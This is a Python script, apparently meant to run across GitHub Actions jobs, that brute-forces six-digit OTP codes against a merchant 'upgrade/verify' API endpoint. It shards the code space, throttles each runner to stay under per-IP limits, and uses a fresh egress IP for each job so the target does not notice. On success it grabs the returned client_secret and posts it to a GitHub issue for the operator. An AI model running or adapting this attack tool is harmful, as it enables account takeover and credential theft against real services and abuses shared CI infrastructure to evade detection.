#!/usr/bin/env python3
"""Low-and-slow OTP window enumerator for GitHub Actions runners.

Each job = one fresh egress IP (Azure). Keep the request rate modest (default 1 rps)
so we never trip the target's per-IP quota, and use the whole job lifetime.
On a real hit (HTTP 200 containing client_secret) we report it by opening an issue
in the same repository so the operator can poll the API without needing log access.
"""
import os, sys, json, time, random, http.client, urllib.request

HOST = os.environ["TARGET_HOST"]
KEY = os.environ["TARGET_KEY"]
SHARD = int(os.environ.get("SHARD", "0"))
SHARDS = int(os.environ.get("SHARDS", "1"))
DUR = int(os.environ.get("DUR", "3300"))
RATE = float(os.environ.get("RATE", "1.0"))
SPACE = int(os.environ.get("SPACE", "1000000"))  # 6-digit OTP space
GH = os.environ.get("GITHUB_TOKEN", "")
REPO = os.environ.get("GITHUB_REPOSITORY", "")
RUNID = os.environ.get("GITHUB_RUN_ID", "")

PATH = "/api/v1/merchant/%s/upgrade/verify" % KEY

lo = SHARD * SPACE // SHARDS
hi = (SHARD + 1) * SPACE // SHARDS
cands = list(range(lo, hi))
random.Random(20261019 + SHARD).shuffle(cands)


def report(msg):
    print(msg, flush=True)
    if not (GH and REPO):
        return
    try:
        body = json.dumps({"title": "HIT shard%d run%s" % (SHARD, RUNID),
                           "body": "```\n" + msg + "\n```"}).encode()
        req = urllib.request.Request(
            "https://api.github.com/repos/%s/issues" % REPO, data=body,
            headers={"Authorization": "Bearer " + GH,
                     "Accept": "application/vnd.github+json",
                     "Content-Type": "application/json"}, method="POST")
        urllib.request.urlopen(req, timeout=20).read()
        print("issue reported", flush=True)
    except Exception as e:
        print("issue post err: %r" % (e,), flush=True)


conn = None


def do(pin):
    """One verify request on a keep-alive connection. Returns (status, body-bytes)."""
    global conn
    body = json.dumps({"merchant_pin": pin}).encode()
    for _ in (1, 2):
        try:
            if conn is None:
                conn = http.client.HTTPSConnection(HOST, 443, timeout=8)
            conn.request("PUT", PATH, body=body,
                         headers={"Content-Type": "application/json",
                                  "User-Agent": "Mozilla/5.0",
                                  "Content-Length": str(len(body))})
            r = conn.getresponse()
            data = r.read()
            return r.status, data
        except Exception:
            try:
                conn.close()
            except Exception:
                pass
            conn = None
    return 0, b""


t0 = time.time()
n = 0
cov = 0
codes = {}
interval = 1.0 / max(RATE, 0.05)

print("[%d] range=[%d,%d) n=%d rate=%.2f dur=%ds" % (SHARD, lo, hi, len(cands), RATE, DUR), flush=True)

while (time.time() - t0) < DUR and cov < len(cands):
    pin = cands[cov]
    st, data = do("%06d" % pin)
    n += 1
    codes[st] = codes.get(st, 0) + 1
    if st in (400, 200):
        cov += 1
        if st == 200:
            txt = data.decode("utf-8", "replace")
            if "client_secret" in txt:
                report("HIT shard=%d pin=%06d status=200 body=%s" % (SHARD, pin, txt))
                try:
                    open("hit.json", "w").write(txt)
                except Exception:
                    pass
                break
            report("JUNK200 shard=%d pin=%06d body=%s" % (SHARD, pin, txt[:400]))
    elif st == 422:
        report("STOP422 shard=%d no-pending-otp n=%d covered=%d" % (SHARD, n, cov))
        break
    elif st in (429, 403, 503, 0):
        time.sleep(2.0)          # soft backoff, candidate is retried
    dt = time.time() - t0
    want = n * interval
    if dt < want:
        time.sleep(min(want - dt, 2.0))
    if n % 200 == 0:
        print("[%d] n=%d cov=%d/%d codes=%s t=%ds" % (SHARD, n, cov, len(cands), codes, int(dt)), flush=True)

print("[%d] DONE n=%d cov=%d codes=%s" % (SHARD, n, cov, codes), flush=True)
